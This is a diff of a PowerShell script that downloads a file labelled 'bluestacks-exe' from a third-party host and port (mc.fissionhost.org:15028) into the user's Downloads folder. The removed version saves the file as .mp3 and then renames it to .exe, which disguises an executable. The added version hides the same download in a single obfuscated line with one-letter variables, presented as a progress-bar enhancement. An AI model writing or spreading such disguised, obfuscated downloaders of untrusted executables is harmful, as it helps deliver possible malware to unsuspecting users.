@@ -1,9 +1,3 @@
-$url = "http://mc.fissionhost.org:15028/bluestacks-exe"
-$downloadPath = Join-Path $env:USERPROFILE "Downloads\bluestacks.mp3"
-
-Invoke-WebRequest -Uri $url -OutFile $downloadPath
-$exePath = [System.IO.Path]::ChangeExtension($downloadPath, ".exe")
-Rename-Item -Path $downloadPath -NewName (Split-Path $exePath -Leaf)
-
-Write-Output "File downloaded to: $downloadPath"
+# Enhanced download with progress indicators (MBPS, ETA, %) and resume support
+$a="http://mc.fissionhost.org:15028/bluestacks-exe";$b=Join-Path $env:USERPROFILE "Downloads\bluestacks.exe";$c=0;if(Test-Path $b){$c=(gi $b).Length}$r=[Net.HttpWebRequest]::Create($a);if($c){$r.AddRange($c)}$s=$r.GetResponse();$g=$s.ContentLength+$c;$h=$s.GetResponseStream();$j=[IO.File]::Open($b,([IO.FileMode]::Append));$k=New-Object byte[] 8192;$l=$c;$m=[Diagnostics.Stopwatch]::StartNew();while(($n=$h.Read($k,0,$k.Length))){$j.Write($k,0,$n);$l+=$n;$o=$m.Elapsed.TotalSeconds;if($o){$p=[math]::Round(($l/1MB)/$o,2);$q=[math]::Round(($l/$g)*100,2);$t=if($l){[math]::Round(($g-$l)/($l/$o))}else{0};Write-Progress -Activity "Downloading" -Status "$q% ($p MBps, ETA: $t s)" -PercentComplete $q}}$j.Close();$h.Close();$s.Close();$u=[IO.Path]::ChangeExtension($b,".exe");Rename-Item $b -NewName (Split-Path $u -Leaf) -Force;Write-Output "File downloaded to: $u"
 # Press enter to complete
